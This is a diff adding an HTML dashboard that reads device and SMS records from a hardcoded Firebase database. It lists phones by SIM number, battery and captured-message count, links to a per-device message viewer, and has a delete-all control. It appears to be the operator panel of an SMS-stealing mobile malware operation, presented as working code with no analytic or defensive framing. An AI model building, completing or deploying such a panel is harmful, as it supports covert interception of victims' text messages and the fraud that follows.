@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Manager</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            padding: 20px;
+        }
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #334155;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .back-btn {
+            color: #94a3b8;
+            text-decoration: none;
+            font-size: 0.9rem;
+            padding: 6px 14px;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            transition: 0.2s;
+        }
+        .back-btn:hover {
+            border-color: #10b981;
+            color: #10b981;
+        }
+        .search-box {
+            background: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 8px;
+            padding: 8px 14px;
+            color: #f8fafc;
+            font-size: 0.9rem;
+            width: 200px;
+            transition: 0.3s;
+        }
+        .search-box:focus {
+            outline: none;
+            border-color: #10b981;
+            width: 250px;
+        }
+        .search-box::placeholder {
+            color: #64748b;
+        }
+        .device-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .device-card {
+            background-color: #1e293b;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 16px 20px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .device-card:hover {
+            border-color: #10b981;
+            transform: translateX(4px);
+        }
+        .device-info {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+        .device-name {
+            font-size: 1.05rem;
+            font-weight: 600;
+        }
+        .device-id {
+            font-size: 0.75rem;
+            color: #64748b;
+            font-family: monospace;
+        }
+        .device-stats {
+            display: flex;
+            gap: 20px;
+            font-size: 0.8rem;
+            color: #94a3b8;
+            flex-wrap: wrap;
+        }
+        .device-stats span {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .charge-bar {
+            display: inline-block;
+            width: 50px;
+            height: 6px;
+            background: #334155;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-left: 4px;
+        }
+        .charge-fill {
+            height: 100%;
+            border-radius: 3px;
+            transition: width 0.5s;
+        }
+        .charge-fill.high { background: #10b981; }
+        .charge-fill.medium { background: #f59e0b; }
+        .charge-fill.low { background: #ef4444; }
+        .device-number {
+            font-size: 0.8rem;
+            color: #475569;
+            min-width: 60px;
+            text-align: right;
+        }
+        .loading {
+            color: #94a3b8;
+            text-align: center;
+            padding: 40px;
+        }
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #334155;
+            border-top: 3px solid #10b981;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .no-results {
+            text-align: center;
+            padding: 40px;
+            color: #64748b;
+        }
+        .status-badge {
+            font-size: 0.75rem;
+            padding: 4px 10px;
+            border-radius: 20px;
+            background: #1e293b;
+            color: #94a3b8;
+            border: 1px solid #334155;
+        }
+        .status-badge.live {
+            color: #10b981;
+            border-color: #10b981;
+        }
+        .delete-all {
+            color: #ef4444;
+            background: none;
+            border: 1px solid #ef4444;
+            padding: 6px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: 0.2s;
+        }
+        .delete-all:hover {
+            background: #ef4444;
+            color: #0f172a;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="header-left">
+                <a href="index.html" class="back-btn">← Back</a>
+                <span style="font-weight: 600;">📋 Devices</span>
+                <span id="device-count" class="status-badge">0</span>
+            </div>
+            <div style="display: flex; gap: 10px; align-items: center;">
+                <input type="text" id="searchInput" class="search-box" placeholder="🔍 Search device..." oninput="filterDevices()">
+                <button class="delete-all" onclick="deleteAllDevices()">🗑️ Delete All</button>
+            </div>
+        </div>
+
+        <div id="device-container">
+            <div class="loading">
+                <span class="spinner"></span>
+                Loading devices...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let allDevices = [];
+        let allSmsData = {};
+
+        // Fetch both datasets in parallel
+        async function loadData() {
+            try {
+                const [usersRes, smsRes] = await Promise.all([
+                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json'),
+                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/common/smsData.json')
+                ]);
+
+                const usersData = await usersRes.json();
+                const smsData = await smsRes.json();
+
+                allSmsData = smsData || {};
+
+                if (!usersData) {
+                    document.getElementById('device-container').innerHTML = '<div class="no-results">No devices found</div>';
+                    return;
+                }
+
+                // Convert to array and sort by last seen (newest first)
+                allDevices = Object.values(usersData)
+                    .filter(d => d.device_id) // Only devices with ID
+                    .map(d => ({
+                        ...d,
+                        lastSeen: d.time || d.count || 'N/A',
+                        joined: d.count || d.time || 'N/A'
+                    }))
+                    .sort((a, b) => {
+                        if (a.lastSeen > b.lastSeen) return -1;
+                        if (a.lastSeen < b.lastSeen) return 1;
+                        return 0;
+                    });
+
+                renderDevices(allDevices);
+
+            } catch (error) {
+                console.error('Error loading data:', error);
+                document.getElementById('device-container').innerHTML = 
+                    `<div class="no-results">❌ Error loading: ${error.message}</div>`;
+            }
+        }
+
+        function renderDevices(devices) {
+            const container = document.getElementById('device-container');
+            document.getElementById('device-count').textContent = `${devices.length} devices`;
+
+            if (devices.length === 0) {
+                container.innerHTML = '<div class="no-results">No devices match your search</div>';
+                return;
+            }
+
+            let html = '<div class="device-grid">';
+            let count = allDevices.length; // Start from total for numbering
+
+            devices.forEach((device, index) => {
+                const charge = device.charge || 0;
+                const chargeClass = charge >= 60 ? 'high' : charge >= 30 ? 'medium' : 'low';
+                
+                // Count messages for this device
+                const deviceMessages = Object.values(allSmsData)
+                    .filter(sms => sms.deviceId === device.device_id);
+                const msgCount = deviceMessages.length;
+
+                // Format phone numbers
+                const sim1 = device.Sim1 || 'No SIM';
+                const sim2 = device.Sim2 || 'No SIM';
+                const displayNumber = sim1 !== 'Insert SIM card!' && sim1 !== 'Number not available' 
+                    ? sim1 
+                    : (sim2 !== 'Insert SIM card!' && sim2 !== 'Number not available' ? sim2 : 'No Number');
+
+                html += `
+                    <div class="device-card" onclick="showDeviceMessages('${device.device_id}')">
+                        <div class="device-info">
+                            <div class="device-name">${device.device_name || 'Unknown Device'}</div>
+                            <div class="device-id">📱 ${device.device_id}</div>
+                            <div class="device-stats">
+                                <span>🔋 ${charge}% 
+                                    <span class="charge-bar">
+                                        <span class="charge-fill ${chargeClass}" style="width:${charge}%"></span>
+                                    </span>
+                                </span>
+                                <span>📨 ${msgCount} messages</span>
+                                <span>📞 ${displayNumber}</span>
+                                <span>🕐 Last: ${device.lastSeen}</span>
+                            </div>
+                        </div>
+                        <div class="device-number">No. ${count - index}</div>
+                    </div>
+                `;
+            });
+
+            html += '</div>';
+            container.innerHTML = html;
+        }
+
+        function filterDevices() {
+            const query = document.getElementById('searchInput').value.toLowerCase();
+            const filtered = allDevices.filter(d => 
+                (d.device_name || '').toLowerCase().includes(query) ||
+                (d.device_id || '').toLowerCase().includes(query) ||
+                (d.Sim1 || '').includes(query) ||
+                (d.Sim2 || '').includes(query)
+            );
+            renderDevices(filtered);
+        }
+
+        function showDeviceMessages(deviceId) {
+            // Redirect to device-sms.html with deviceId as query param
+            window.location.href = `device-sms.html?device=${deviceId}`;
+        }
+
+        function deleteAllDevices() {
+            if (confirm('⚠️ Delete ALL devices? This cannot be undone!')) {
+                if (confirm('Are you absolutely sure?')) {
+                    // Delete the entire users node
+                    fetch('https://sb-rex-11-default-rtdb.asia-southeast1.firebasedatabase.app/users.json', {
+                        method: 'DELETE'
+                    }).then(() => {
+                        alert('✅ All devices deleted!');
+                        location.reload();
+                    }).catch(err => {
+                        alert('❌ Error: ' + err.message);
+                    });
+                }
+            }
+        }
+
+        // Load on page load
+        loadData();
+
+        // Refresh every 30 seconds
+        setInterval(loadData, 30000);
+    </script>
+</body>
+</html>
